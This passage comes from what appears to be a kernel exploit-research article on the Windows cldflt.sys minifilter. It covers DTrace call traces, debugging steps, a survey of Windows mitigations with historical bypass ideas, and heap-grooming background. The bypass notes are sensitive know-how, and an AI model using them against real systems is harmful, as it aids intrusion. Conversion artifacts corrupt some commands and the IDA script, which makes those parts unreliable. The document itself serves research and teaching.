06. HsmiCreateAllocateECPTags\
07. memset\
08. \_security\_check\_cookie\
09. HsmFltPostCREATE\
10. HsmFltPostNETWORK\_QUERY\_OPEN\
11. HsmiFltPostECPCREATE\
12. HsmpTracePostCallbackEnter\
13. HsmFltPreNETWORK\_QUERY\_OPEN\
14. HsmOsGetPlaceholderCompatMode\
15. HsmpGetRequestorThread\
16. HsmpGetRequestorMode\
17. HsmiOsIsSyncProviderProcess\
18. \_security\_check\_cookie\
19. HsmpIs32bitProcess\
20. HsmiOsIsForegroundHydrator\
21. wil\_details\_FeatureReporting\_ReportUsageToService\
22. wil\_details\_MapReportingKind\
23. wil\_details\_FeatureReporting\_ReportUsageToServiceDirect\
24. wil\_details\_FeatureReporting\_RecordUsageInCache\
25. \_security\_check\_cookie\
26. HsmiOsGetProcessFlags\
27. \_security\_check\_cookie\
28. \_security\_check\_cookie\
29. HsmFltPreCREATE\
30. HsmiFltPreECPCREATE\
\
root@ubuntu01:~# cat trace\_reparse\_numbered.txt \| wc -l 1769\
\
I have excluded HsmDbgBreakOnStatus and WPP\* routines because they are not important to our purposes right now and they appear too much.\
\
By now we know the exact order of routines and functions called within clfflt.sys by the reparse program, which certainly helps to gain a better understanding of the mini-filter drivers. Although I have already shown the following list here, it is appropriate to list import routines from our study again:\
\
HsmFltPostQUERY\_OPEN or HsmFltPostNETWORK\_QUERY\_OPEN\
\
HsmiFltPostECPCREATE\
\
HsmpSetupContexts\
\
HsmpCtxCreateStreamContext\
\
HsmpRpValidateBuffer\
\
HsmpBitmapIsReparseBufferSupported\
\
HsmIBitmapNORMALOpen\
\
As an example, we are interested in learning the order of routines that are called before and after HsmIBitmapNORMALOpen, and we can check them by running the following command:\
\
root@ubuntu01:~# cat trace\_reparse\_numbered.txt \| grep HsmIBitmapNORMALOpen -A20 -B35\
\
711. \_security\_check\_cookie\
712. HsmFltPostCREATE\
713. HsmFltPostNETWORK\_QUERY\_OPEN\
714. HsmiFltPostECPCREATE\
715. HsmpTracePostCallbackEnter\
716. HsmpTracePostCallbackEnter\
717. HsmpSetupContexts\
718. HsmOsIsPassThroughModeEnabled\
719. HsmiOsIsPassThroughModeEnabled\
720. \_security\_check\_cookie\
721. HsmpRpReadBuffer\
722. HsmpRpiDecompressBuffer\
\
HsmiCldGetSyncRootFileIdByFileObject\
\
0724\. HsmiQueryFullFilePath\
\
0725\. memcpy\
\
0726\. memmove\
\
0727\. CldHsmGetSyncRootFileIdByPath\
\
0728\. HsmiCldGetSyncRootFileIdByPath\
\
0729\. HsmiCldOpenSyncRoot\
\
0730\. memcpy\
\
0731\. memmove\
\
0732\. memcpy\
\
0733\. memmove\
\
0734\. \_security\_check\_cookie\
\
0735\. HsmpCtxCreateStreamContext\
\
0736\. HsmiCtxGetOrCreateFileContext\
\
0737\. HsmiCtxCreateFileContext\
\
0738\. memset\
\
0739\. CldHsmCreateFileContext\
\
0740\. memset\
\
0741\. memset\
\
0742\. HsmpRpValidateBuffer\
\
0743\. HsmpBitmapIsReparseBufferSupported\
\
0744\. memcpy\
\
0745\. memmove\
\
0746\. HsmIBitmapNORMALOpen\
\
0747\. HsmiBitmapNORMALComputeMaxUserFileSize\
\
0748\. memset\
\
0749\. memcpy\
\
0750\. memmove\
\
0751\. HsmiBitmapNORMALGetNumberOfPlexCopies\
\
0752\. HsmExpandKernelStackAndCallout\
\
0753\. HsmiBitmapNORMALOpenOnDiskCallout\
\
0754\. HsmiBitmapNORMALOpenOnDisk\
\
0755\. HsmiBitmapNormalOpenStream\
\
0756\. RtlUnicodeStringPrintf\
\
0757\. HsmpRelativeStreamOpenById\
\
0758\. HsmiOpenFile\
\
0759\. \_security\_check\_cookie\
\
0760\. HsmiBitmapTranslateIOStatus\
\
0761.\
\
HsmiBitmapNORMALGetNumberOfPlexCopies\
\
0762\. \_security\_check\_cookie\
\
0763\. HsmpBitmapGetRangeState\
\
0764\. HsmExpandKernelStackAndCallout\
\
0765\. HsmpBitmapQueryRangeExCallout\
\
766. ## HsmpBitmapQueryRangeEx\
\
767. \_security\_check\_cookie\
768. HsmFltPostCREATE\
769. HsmFltPostNETWORK\_QUERY\_OPEN\
770. HsmiFltPostECPCREATE\
771. HsmpTracePostCallbackEnter\
772. HsmpTracePostCallbackEnter\
773. HsmpSetupContexts\
774. HsmOsIsPassThroughModeEnabled\
775. HsmiOsIsPassThroughModeEnabled\
776. \_security\_check\_cookie\
777. HsmpRpReadBuffer\
778. HsmpRpiDecompressBuffer\
\
HsmiCldGetSyncRootFileIdByFileObject\
\
1151\. HsmiQueryFullFilePath\
\
1152\. memcpy\
\
1153\. memmove\
\
1154\. CldHsmGetSyncRootFileIdByPath\
\
1155\. HsmiCldGetSyncRootFileIdByPath\
\
1156\. HsmiCldOpenSyncRoot\
\
1157\. memcpy\
\
1158\. memmove\
\
1159\. memcpy\
\
1160\. memmove\
\
1161\. \_security\_check\_cookie\
\
1162\. HsmpCtxCreateStreamContext\
\
1163\. HsmiCtxGetOrCreateFileContext\
\
1164\. HsmiCtxCreateFileContext\
\
1165\. memset\
\
1166\. CldHsmCreateFileContext\
\
1167\. memset\
\
1168\. memset\
\
1169\. HsmpRpValidateBuffer\
\
1170\. HsmpBitmapIsReparseBufferSupported\
\
1171\. memcpy\
\
1172\. memmove\
\
1173\. HsmIBitmapNORMALOpen\
\
1174\. HsmiBitmapNORMALComputeMaxUserFileSize\
\
1175\. memset\
\
1176\. memcpy\
\
1177\. memmove\
\
1178\. HsmiBitmapNORMALGetNumberOfPlexCopies\
\
1179\. HsmExpandKernelStackAndCallout\
\
1180\. HsmiBitmapNORMALOpenOnDiskCallout\
\
1181\. HsmiBitmapNORMALOpenOnDisk\
\
1182\. HsmiBitmapNormalOpenStream\
\
1183\. RtlUnicodeStringPrintf\
\
1184\. HsmpRelativeStreamOpenById\
\
1185\. HsmiOpenFile\
\
1186\. \_security\_check\_cookie\
\
1187\. HsmiBitmapTranslateIOStatus\
\
1188\. HsmiBitmapNORMALGetNumberOfPlexCopies\
\
1189\. \_security\_check\_cookie\
\
1190\. HsmpBitmapGetRangeState\
\
1191\. HsmExpandKernelStackAndCallout\
\
1192\. HsmpBitmapQueryRangeExCallout\
\
1193\. HsmpBitmapQueryRangeEx\
\
At this point, we got a solid way to trace all routines and functions called within cldflt.sys minifilter driver. The use of DTrace has been useful for tracking proofs of concept (PoC) and monitoring the sequence of routines called, gaining a complete understanding of what is working or not, and also for knowing how far the execution progresses.\
\
There is a brief list of observations I learned while conducting these experiments related to this article and other exploits, which can save a lot of time in trying to understand what is really happening:\
\
The reparse\_point program (renamed as reparse while working with DTrace) will not work appropriately whether you run it twice or more at the same boot due to issues related to memory cache, but not only for this reason. There are two options, which are either to reboot the virtual machine or restore the snapshot. Both have worked perfectly and the reparse\_point program itself works smoothly in both contexts, regardless of the operating system (Windows 10 22H2, Windows 11 22H2 and Windows 11 23H2).\
\
▪ I have realized that DTrace (in special, fbt provider) does not work well when the snapshot is restored, even reattaching WinDbg. Apparently, it is necessary to reboot the system to make that the fbt to work since the boot.\
\
Although it should be enough, I had other issues with this approach. The reparse\_point program works as expected, but DTrace does not work well at the first launch of the program and loses multiple events. If the reparse\_point is executed a second time, Dtrace captures all events this time, but the own reparse\_point program does not work as should do.\
\
▪ Another lesson that I have learned is that breakpoints cannot be set up because DTrace outputs a message like “Abort due to systemic unresponsiveness". Therefore, the recommendation here is to clear all breakpoints.\
\
My solution to all these problems follows:\
\
On WinDbg, break the system and clear all breakpoints: bc \*\
\
▪ Unload the driver: fltmc unload CldFlt\
\
▪ Load the driver again: fltmc load CldFlt Repeat the capturing process using DTrace.\
\
▪ If you are not testing DTrace, but you want to evaluate the reparse\_point code without needing to restore the snapshot, the solution is similar, but not equal:\
\
On WinDbg, clear all breakpoints: bc \* Unload the driver: fltmc unload CldFlt Load the driver again: fltmc load CldFlt On WinDbg, break the system and reload symbols: .reload ▪ Setup the breakpoints again:\
\
▪ bp cldflt!HsmpCtxCreateStreamContext bp cldflt!HsmIBitmapNORMALOpen bp cldflt!HsmpRpValidateBuffer bp cldflt!HsmpBitmapIsReparseBufferSupported bp cldflt!HsmIBitmapNORMALOpen+0x601\
\
▪ bp cldflt!HsmIBitmapNORMALOpen+0x6d\
\
We have confirmed that the reparse\_point program works well, got a considerable amount of knowledge of cldflt.sys minifilter internals and also tracked the sequence of routines being invoked. However, we have not reached the vulnerable line of code yet, even though it is not a problem right now. It is time to move on and refresh Windows protection and memory management concepts.\
\
Before starting this article, I had no plans to comment about this subject, but I reconsidered and judged that summarizing refreshing could be useful.\
\
# 15\. Protections and Memory Management\
\
This section is divided into subsections to provide readers with better organization and understanding of coming explanations.\
\
# 15.01. Security Protections\
\
In the current days, exploiting Windows targets and, in special, drivers (kernel driver, minifilter drivers and device drivers), can be challenging on Windows 11 systems, and as expected it depends on bypassing active protections. Almost certainly, when the target are drivers, DSE (Driver Signature Enforcement) is one of the most known protections , which controls that only digitally signed (by a trusted certificate) drivers can be loaded, and also ensures that drivers that make part of a pre-established vulnerable driver blocklist also cannot be loaded. DSE is an essential protection because if an attacker is able to load an unsigned drivers then this attacker can infect the system using a rootkit, modify the kernel memory and compromise the PatchGuard protection. DSE can be disabled when the system is booted in test mode (bcdedit /set testsigning on), except when Secure Boot protection is enabled. HVCI (Hypervisor-Protected Code Integrity), which is activated as a consequence of enabling VBS (Virtualization-Based Security), is a second and strong protection that enforces kernel driver blacklist and also helps the memory manager to guarantee that allocations are writable or executable, but never both $( \\mathsf { W } ^ { \\wedge } )$ . The restriction $( \\mathsf { W } ^ { \\wedge } )$ is imposed via memory manager, and VBS/HVCI ensures via hypervisor that it cannot be changed due to enforcing protections at SLAT level, which does not permit permissions are changed by operating system guests.\
\
These first two protections (DSE and HVCI) are enough to manage attacks through code injection into kernel, rootkit infection, and elevation of privilege. Furthermore, if we consider that VBS creates VTLs 0 and 1 (Normal Kernel and Secure Kernel, respectively), and there is the possibility of creating VTL 2, which is associated with hardware protection features, VBS can also contribute to security protection against exploitation in multiple ways. First, using KDP (Kernel Data Protection), which considers the secure kernel and the SLAT (second level address translation) to help to protect kernel data structures. Additionally, it also configures memory with read-only permission, and depending on the processor, there is the possibility of improving the security by associating it with CET (control-flow enforcement technology) to provide stack protection via shadow stack.\
\
In fact, the number of security (exploitation) protections on Windows is far larger than it and most of them must be regarded while exploiting user and kernel code. Anyway, a compact list of exploit protections and its respective summary follow because:\
\
DEP/kDEP: Data Execution Prevention (also known as No-Execute), which is enforced by the PTE, makes stack and heap (user-mode and kernel-mode) non-executable. ROP (Return-OrientedProgramming) technique has been one of techniques used to disable DEP in user space over time. To circumvent kDEP protection, attackers used a read-write primitive to read and alter PTE control bits to allow RWX. The existence of the hypervisor, which is the owner and manages SLAT (Second Layer Address Translation) in specific (EPT for Intel processors and NPT for AMD processors),\
\
prevents it from being successful because are page-level protections and permission from SLAT that really matter and not page-level protection and permissions from guest page tables (VTL 0). Furthermore, the second-layer page tables can be modified only by the hypervisor and not by the guest operating system. In a scheme, we have GVA (Guest Virtual Address) Guest Physical Address $( \\mathsf { G P A } ) \\to \\mathsf { H P A }$ (Host Physical Address), where there are page-level permissions from guest PTE and also from SLAT. Therefore, even if a guest PTE has RWX, but the permission on SLAT is RW-, this latter one is the effective permission. The difference offered $\\mathsf { H V C l + S L A T }$ from PatchGuard is that the former is preventive (prior to the incident) while the second is reactive (after the incident).\
\
▪ GS stack cookie: one of oldest Windows defensive mechanisms, it protects against stack overflow, mainly protecting the return address of being overwritten, and also other structures addresses on the stack such as virtual tables, function pointers, and exception registration records. At the time, one of most used ways to avoid overwriting the stack cookie was to trigger and manipulate exception handler and next exception handler. Protections such as SafeSEH and SEHOP have been introduced to prevent exception handler and exception chain manipulation. Moreover, the entropy of the cookie (64-bit), which is also XOR-encoded, and its address is randomized by ASLR, has been improved and it is resilient against brute-force attacks. If the processor supports CET (Control-flow Enforcement Technology), the composition of $\\mathsf { G S } + \\mathsf { C E T }$ , which provides shadow stack, offers a solid protection against stack overflow.\
\
ASLR/KASLR: Address Space Layout Randomization protection randomizes the base address of structures (PEB/TEB), modules, and DLLs, while kASLR randomizes the kernel base address, HAL, win32k (and associated modules), kernel modules and kernel pool. Over time, Windows have introduced improvements for ASLR such as High Entropy ASLR and Force ASLR, which extends the memory address variance (randomness) and enforces that ASLR to be mandatory respectively, even for applications not compiled with /DYNAMICBASE flag. In the current days, the best approach to circumvent ASLR/kASLR is through of finding a memory leak (kernel object, module base, heap address, virtual table or even any pointer), which provides a fixed reference on memory, and use it as starting reference to reach the target address by adding or subtracting an offset. Other technique used for trying to decrease the ASLR/kASLR influence making use of heap spray to shape the memory layout (grooming / Heap Feng Shui) with a well-known pattern that increases chances of an exploit execution to land on a memory-controlled region. In terms of APIs, EnumDeviceDrivers and NtQuerySystemInformation were used to retrieve base addresses of loaded kernel modules , but they have been severely restricted in modern version of Windows 11, the accessed to kernel address information is now blocked, and even if a system doesn’t have VBS/HVCI enabled, it is still necessary Administrator rights and specific privileges to use them. Additionally, HAL leaks (and other ones such as GDI leaks) have been gradually fixed over time, the own HAL memory has been randomized by ASLR at the boot stage, and with the introduction of VBS/HVCI, its pages cannot be modified or mapped into user space.\
\
Integrity Levels: The effectivity of ASLR/KASLR has been improved by implementation of Integrity Levels and AppContainer. Integrity Levels implements MIC (Message Integrity Control) over the old ACLs, which offers discretionary control access. The main objective of Integrity Level is to prevent low-untrusted processes from modifying higher-trusted objects (named pipes, files, sections,\
\
registry key, and other ones) by implementing levels and classifying process as Untrusted, Low, Medium, Medium Plus, High, System and Protected Process Light (PPL), where a few Windows processes are labeled with this last mentioned level. Furthermore, other mechanisms such as restricted token, low-box token (provided by AppContainer that always run at low integrity level) and split-token administrator offer extra flexibility because they allow running an application with a low-level integrity, with a least-privilege execution capability and controlled access to files and, consequently, results in a block mechanism that prevents processes at this level to use important APIs and consequently to bypass ASLR/kASLR. The fact is that AppContainer is much more restrictive than options offered by Integrity Levels, and provides Registry, file system, and network isolation, besides that is not possible to perform token elevation. Additionally, it protects win32k.sys and related components that block a series of accesses to GDI and legacy APIs. The big picture here is that the control access is evaluated by following an order: integrity level token access discretionary access control (DACL). To list processes classified as Protected Process Light (PPL), the following WinDbg command can be used:\
\
0: kd> dx -r1 -g @$cursession.Processes.Where(process => process.KernelObject.Protection.Signer > 0).Select(p $= >$ new {Name $=$ p.Name, Protection $=$ p.KernelObject.Protection.Signer}).OrderByDescending(obj $= >$ obj.@"Protection"),d\
\
|     |\
| --- |\
| = Name = Protection = |\
| = \[4\] System 7 |\
| \[116\] = Registry 7 |\
| = \[2352\] MemCompression 7 |\
| = \[496\] smss.exe b 6 |\
| = \[696\] csrss.exe 6 |\
| = \[776\] wininit.exe 6 |\
| \[784\] = csrss.exe 6 |\
| \[920\] services.exe 6 |\
| = = \[5304\] svchost.exe 5 |\
| \[10568\] = SecurityHealthService.exe 5 |\
| \[10432\] = svchost.exe 5 |\
|  |\
| \[9652\] = svchost.exe 5 = |\
| \[9120\] = svchost.exe 5 = |\
| \[2708\] = sppsvc.exe 5 = |\
| \[932\] = lsass.exe 4 = |\
| \[3552\] = MpDefenderCoreService.exe 3 = |\
| \[3660\] MsMpEng.exe - 3 = |\
\
# 0: kd> dt \_PS\_PROTECTED\_SIGNER ndis!\_PS\_PROTECTED\_SIGNER\
\
PsProtectedSignerNone $= \\Theta \\mathsf { n } \\Theta$\
\
PsProtectedSignerAuthenticode $=$ 0n1\
\
PsProtectedSignerCodeGen $=$ 0n2\
\
PsProtectedSignerAntimalware $=$ 0n3\
\
PsProtectedSignerLsa $=$ 0n4\
\
PsProtectedSignerWindows $=$ 0n5\
\
PsProtectedSignerWinTcb $=$ 0n6\
\
PsProtectedSignerWinSystem $=$ 0n7\
\
PsProtectedSignerApp $=$ 0n8\
\
PsProtectedSignerMax $=$ 0n9\
\
SMEP: Supervisor Mode Execution Prevention prevents kernel code to execute user mode code. Previously, attackers used to execute code in NonPagedPool, but Microsoft implemented NonPagedPoolNx, and such a kernel pool memory area became non-executable. Afterwards, attackers began executing code in user space from within the kernel, and SMEP has been introduced to prevent it, and consequently blocking any arbitrary code execution with kernel privileges. One of well-known techniques used to bypass SMEP was changing the CR4 register (CR4.SMEP bit) to disable the protection. Afterwards, attackers adopted another approach by changing the User/Supervisor bit to 0 (Supervisor) because SMEP only blocks executions from user pages, and this action allowed the page (and code) to be executed by kernel. Once again, the combination of VBS/HVCI (via SLAT) and PatchGuard have restricted access to the page tables, which also make these techniques not effective because the guest CR4 is not really considered (untrusted), and the hypervisor is the actual responsible to enforce page-level permissions, including SMEP protection. As a reactive measure, PatchGuard has been actively monitoring control registers (including CR4) and kernel structures, and any violation causes a bug check and consequently the system crashes. Even kernel code has been improved to not offer easy gadgets that provide ways to change CR4 register as well as restrictions to indirect calls via CFG/kCFG. Finally, Windows have marked multiple PTE pages as read-only and as mentioned previously, the hypervisor\
\
HyperGuard: it is also known as Security Kernel Patch Guard, which runs on VTL 1 (where the Secure Kernel runs) and was implemented with the introduction of VBS mechanism on Windows. As HyperGuard runs out of the normal kernel (HyperGuard runs on VTL 1), it can monitor normal kernel memory from the hypervisor perspective and prevent such kernel memory from being tampered with user and kernel code. As a direct consequence, it makes harder to tamper important kernel structures, CR4.SMEP bit, U/S bit to bypass SMEP and perform any other PTE manipulation. In general, recent versions of Windows 11 work with three main layers of protections: PatchGuard runs on VTL 0 (normal kernel) monitoring kernel and its structures; HVCI implements the idea of SLAT and establishes, via hypervisor, a second layer of dominant page table entries; Hyperguard that protects the hypervisor, SLAT (EPT for Intel processor) structures, securekernel.exe, VTL 1 structures and memory regions.\
\
▪ CFG/kCFG: CFG (Control Flow Guard) protects indirect calls (call \[rax\]) to transfer the control flow execution to a non-expected address, which prevents any change of the execution flow to an arbitrary code that can be a ROP gadget or a middle of a function, for example. On the other hand, CFG does not protect the code against direct calls, jumps, or returns. Furthermore, the CFG does not make additional and deep checking, and does not protect the code execution from being transferred to any valid registered address (function or virtual table entry). Therefore, to an attacker, it would be enough to overwrite the register to call a destination address that exists in the CFG control map (actually, a bitmap for the process). As consequence, if the attacker corrupts the vtable entry, the vtable pointer or even a virtual table pointer within object, the code execution occurs since its target address is valid. Another issue is that CFG does not really check if the function is actually the desired one and also does not check if the return address is a shellcode, for example.\
\
Extended Control Flow Guard (XFG): this protection is an improvement of CFG because it uses the hash of the destination function (callee), which is based on a series of elements such as parameter types, return type, number of parameter and even its calling convention, and this hash that will be used to check if the execution flow is being transferred to the right function, is placed 8 bytes before the call instruction. A note here is that attackers could use another function with the same elements to try to generate the same hash to try to bypass the XFG protection. Curiously, it is not so difficult to get a list of functions that results in the same hash, and there are public articles on the topic. Moreover, XFG has same characteristics as CFG, and only protects against unauthorized indirect calls, but does not acts on direct calls.\
\
▪ PTE Randomization: it is a mitigation to randomize the base address and consequently layout of the Page Table Entries (PTEs), which holds and enforces security protections and permissions, and makes harder to locate such PTEs on memory or predict where they will be placed. Over years, attackers have tried to manipulate their content to change eventual enforced protections and permissions. While the PTE’s base address was fixed in prior Windows versions, it has been randomized since Windows 10 1607 as well as the own PTEs have been spread over the memory to avoid using contiguous memory addresses, which results in adjacent virtual addresses with different and separated PTEs. Historically attackers have used memory leaks and also used tricks such as nt!MiGetPteAddress $\\aleph + 0 { \\times } 1 3$ to retrieve the PTE’s base address, which was mitigated.\
\
▪ KDEP: it means Kernel Data Protection, which has been created to prevent data corruption (and not code corruption) on Windows kernel and kernel drivers. As mentioned previously, KDEP makes part of VBS protection umbrella, and it is composed of a set of APIs that can be used to mark certain kernel memory regions as read-only without granting ways to attackers to revert their permissions that are monitored and protected by the hypervisor (once again, SLAT is involved). KDEP is implemented as a two-parts protection, whose first part is the static KDP and protects image section from be modified from any program or entity on VTL 0 by marking the memory region as read-only, and its second part named Dynamic KDP manages memory allocation and deallocation from a secure pool, and that also seals such a memory region as read-only too.\
\
HAL Randomization: a few years ago (Windows 8 and first versions of Windows 10), both virtual and physical addresses of the heap memory used by HAL were fixed on memory (0xFFFFFFFF’FFD00000 and 0x1000 respectively), which served as a fixed reference to bypass ASLR. As expected, the base address of the heap region holding HAL has been randomized too. In terms of bypassing, attackers have been used vulnerable drivers to read kernel base address and, eventually, HAL base address.\
\
ACG: Arbitrary Code Guard has been implemented to prevent executable code generation at runtime (usually via JIT) and also any modification of existing executable pages because such pages, once allocated, cannot have their protection changed (for example, it is not allowed to change from RW to RX). Additionally, ACG prevents injection of arbitrary code execution into Microsoft Edge browser as well as performing any RWX memory allocation in its address space via VirtualAlloc function, for example. As a relevant note, ACG is enabled by process and not for the entire system, does not protect against the usage of existing code (ROP or JOP) and also does not prevent\
\
attackers from loading modules and create their ROP chains using such modules. As there are many modules without ACG, attackers have been used such modules without ACG protection to generate dynamic code.\
\
SMAP: Supervisor Mode Access Prevention, which blocks any user code access from the kernel code. Its support is enabled at processor level through CR4.SMAP bit. SMAP works as a new mitigation to prevent typical exploitation techniques such as double-fetch from user buffers to kernel, and kernel vulnerability dereference of a user pointer. Obviously, if the kernel cannot access user code, then it cannot read user pointers, and this blocks a number of other techniques.\
\
Extending the discussion on the SMAP topic a bit further, Microsoft has introduced it for Windows Insider Program (Canary version), and a concise list of comments follows:\
\
for now, a few of SMAP-enabled functions ends with “Smap” string. these functions belong to KSCP segment. they make use of stac and clac Assembly instructions.\
\
To list them on IDA Pro, one of many alternatives is to use IDA Python, as shown below:\
\
import idaapi import idautils import idc\
\
def list\_smap\_functions(): print("\\nSMAP-enabled functions:\\n") for ea in idautils.Functions(): name $=$ idc.get\_func\_name(ea) if name.endswith("Smap"): print(f"\[+\] $\\Theta \\times$ {ea:X} : {name}")\
\
if **name** $= =$ " **main**": list\_smap\_functions()\
\
SMAP-enabled functions:\
\
$\[ \+ \]$ 0x140C5A960 : KscpReadUCharFromUserSmap \[+\] 0x140C5A9A0 : KscpWriteUCharToUserSmap $\[ + \]$ 0x140C5A9E0 : KscpReadUShortFromUserSmap \[+\] 0x140C5AA40 : KscpWriteUShortToUserSmap \[+\] 0x140C5AAA0 : KscpReadULongFromUserSmap \[+\] 0x140C5AAE0 : KscpWriteULongToUserSmap \[+\] 0x140C5AB20 : KscpReadULong64FromUserSmap \[+\] 0x140C5AB80 : KscpWriteULong64ToUserSmap \[+\] 0x140C5ABE0 : KscpCopyFromUserSmap \[+\] 0x140C5AC40 : KscpCopyToUserSmap \[+\] 0x140C5ADA0 : KscpSetUserMemorySmap \[+\] 0x140C5AE00 : KscpStringLengthFromUserSmap \[+\] 0x140C5AE60 : KscpWideStringLengthFromUserSmap \[+\] 0x140C5B060 : KscpMemmoveUserToUserSmap\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
Although it is not exclusively associated with SMAP, I recommend you watch the presentation named Pointer Problems – Why We’re Refactoring the Windows Kernel from Joe Bialek at Blue Hat 2024: [https://www.youtube.com/watch?v=-3jxVIFGuQw](https://www.youtube.com/watch?v=-3jxVIFGuQw).\
\
We have discussed protections to memory, and this memory is the virtual one, whose reading or writing access is offered through APIs and native calls. However, attackers can exploit a driver (most of cases a device driver) using physical memory access and, in this case, it is likely that functions such as:\
\
▪ MmAllocateContiguousMemory: it allocates non-paged memory that is contiguous in physical address space.\
\
MmMapIoSpace: it maps physical address space to nonpaged system memory.\
\
MmAllocateMappingAddress: it reserves a range of system address space of the specified size.\
\
MmAllocatePagesForMdl: it allocates zero-filled, non-paged, physical memory pages to an MDL.\
\
MmBuildMdlForNonPagedPool: it receives an MDL that specifies a nonpaged virtual memory buffer and updates it to describe the underlying physical pages.\
\
And multiple other ones can be used as viable ways, causing new read and write primitives to come up, revealing new vulnerability paths. In fact, there is a huge series of vulnerabilities that can be caused due to the misunderstanding of these and many other functions related to device drivers, kernel drivers and minifilter drivers, but this is subject to future articles.\
\
# 15.02. Memory Management Concepts\
\
One of important topics while developing exploits is memory management, and there are excellent articles and presentations that cover concepts, definitions, mechanisms, structures, attacks, and other details on this subject and have been published over years. Therefore, I do not have any intention or plan to provide a minimally detailed explanation about it and next pages represent only a summarized review on completely random points that could also be useful for the coming section. To get a correct, deep, and precise understanding of it, readers should check books and related articles, where a few one of them are listed in the reference sections at end of this text.\
\
A summary of facts about memory on Windows 10/11:\
\
▪ Every process has a default heap, at least.\
\
▪ There are different heap types: NT Heap (Front End and Back-End layers) and Segment Heap.\
\
# NT Heap (the default allocator)\
\
It is composed of Back-End and Front-End Heap (\_HEAP).\
\
The Low Fragmentation Heap (LFH) represents the Front-End Heap.\
\
The LFH attends, in general, the most common and equivalent size allocations.\
\
LFH is used for allocation size smaller than 16 KB.\
\
LFH is enabled after 18 consecutive chunk (\_HEAP\_ENTRY) allocations of the same size.\
\
The rules that govern LFH are basically the same rules since Windows 7, as well as the objective, which is preventing fragmentation by using a bucket scheme that enforces requested blocks with\
\
matching size to be allocated from the same bucket (holds chunks for the same size). On the other hand, memory management is not as efficient as the offered by the Back-End, and LHF does not split a block to fill a small-size allocation.\
\
The memory space for LFH during a first size-allocation comes from the back-end allocator and, to attend to such demand, the back-end allocator allocates necessary userblocks, which will have free chunks that can be used.\
\
The mechanism is not so simple, and there is a potential consequence in demanding many requests by chunks because, as explained in the prior item, it will consume free chunks from LFH, and it will cause such requests for additional chunks to be passed to Back-End allocator. The back-end allocator tries to fill up such requests by creating userblocks using already available pages. Once it is out of pages, the heap will be extended to create new and subjacent userblocks to attend to LHF requests. Note that we cannot predict the order of allocation of a chunk within a userblock, but we can force, under determined conditions, the sequential and sub adjacent allocation of userblocks at the backend.\
\
Before readers may consider overflowing an userblock to the next one, it is suitable to highlight that they are protected by guard pages at the end. Therefore, any kind of operation that touches on guard pages will cause a crash, which enforces and limits that any attempt of exploitation must occur within a userblock.\
\
▪ After enabling the LFH for a given size, next chunk allocations will be attended by the Front-End allocator (LFH).\
\
▪ In terms of structure, a userblock is represented as a collection of chunks with the same size. These chunks are equal or smaller than 1 KB.\
\
▪ Different from Windows 7 when LFH blocks were allocated sequentially (the appropriated term is predictably), on Windows 10/11 they are allocated randomly, and this fact makes LFH less attractive to be exploited.\
\
A structure named ListHint is used by the allocator to find the appropriate chunk (faster structure). Such chunks are provided and sequentially removed from the ListHint if they are suitable and match with the requested size. In other words, ListHint works as a first and faster provider of chunks (similar behavior to a cache).\
\
▪ Once the LFH is enabled for a specific size, it is only disabled in the next boot.\
\
▪ Freed chunks return to the FreeList.\
\
▪ When attending allocations bigger than 16 KB and smaller than 1 MB, the mechanism is similar, but without the LFH, obviously.\
\
An important fact that must be regarded for a freed chunk is the coalescing effect, when occurs a verification done by the kernel memory manager to check if the previous or next chunk in the list is also free, and if one of them are then both chunks are merged.\
\
To exploitation, LFH was particularly useful on Windows 7, but since Windows 10 its randomness made things harder and less valuable when compared to previous versions. However, the same usual technique for heap spraying keeps valid, where we must fill up a given UserBlock region with new blocks, free one of them, and a next allocation will potentially return the same memory chunk (the hole) and with the same size too. At the end, it could be classified as a kind of reuse-attack and turns out to be a clever way to hijack the execution control flow and leak kernel pointer. We will discuss a bit more about it later.\
\
# Segment Heap (user space)\
\
▪ The Segment Heap is composed of:\
\
Low Fragmentation Heap: it services requests up to 16,268 bytes. However, LFH only acts whether the allocation size is usually used in allocations.\
\
Variable Size: it services requests from 0 to 128K (inclusive)\
\
Backend Allocation: it services requests from 128 KB to 508K.\
\
Large Block Allocation: it services requests above 508 KB.\
\
▪ Under the Segment Heap view we have:\
\
▪ Frontend Allocation ▪ Low Fragmentation Heap (LFH) Variable Size Allocation (VS Allocation)\
\
▪ Backend Allocation ▪ Backend Heap (Segment Allocation)\
\
▪ Large Block Allocation\
\
▪ FrontEnd and HeapEnd are managed and organized by segments.\
\
▪ LFH does not offer an individual header per block, but a block status that is managed by a bitmap managed by their respective subsegment. It helps LFH chunks to be freed very quickly because it is enough to clear a simple bit from the bitmap map. If the requested memory from the FrontEnd is not enough, it will be allocated from the BackEnd to the FrontEnd. Typically, allocations from HeapAlloc and RtlAllocateHeap go through RtlpHpAllocateHeap when the heap is managed by SegmentHeap. In terms of BackEnd heap, it is used for bigger allocations as something between 128 KB and 512 KB and, as mentioned above, it is also used by LFH and VS to request creation of segments, which contain pages that are tracked by page range descriptors.\
\
▪ As explained previously, large blocks are used for block requests above 512 KB, but such blocks do not have headers and are managed (allocated and freed) by functions from NT Memory Manager. Any block allocation results in updating both block’s header and the large allocation bitmap. VS and LHF are protected by XOR encoding keys, but VS is more attractive in terms of exploitation because each block has its own header.\
\
Just in case you have been wondering what processes are using Segment Heap, I have written a simple one-liner command to be used on WinDbg:\
\
0: kd> dx Debugger.Sessions\[0\].Processes.Select(p $= >$ new { PID $=$ p.Id, Name $=$ p.Name, Sw\
\
$=$ p.SwitchTo(p) , HeapLines $=$\
\
Debugger.Utility.Control.ExecuteCommand("!heap")}).Where(proc $= >$\
\
proc.HeapLines.Skip(1).Any(line $= >$ line.Contains("Segment Heap"))).Select(proc $= >$ "PID: II\
\
$^ +$ proc.PID $^ +$ ", Name: " $^ +$ proc.Name)\
\
Debugger.Sessions\[0\].Processes.Select(p => new { PID = p.Id, Name = p.Name, Sw = p.SwitchTo(p) , HeapLines = Debugger.Utility.Control.ExecuteCommand("!heap")}).Where(proc => proc.HeapLines.Skip(1).Any(line => line.Contains("Segment Heap"))).Select(proc => "PID: " + proc.PID + ", Name: " + proc.Name)\
\
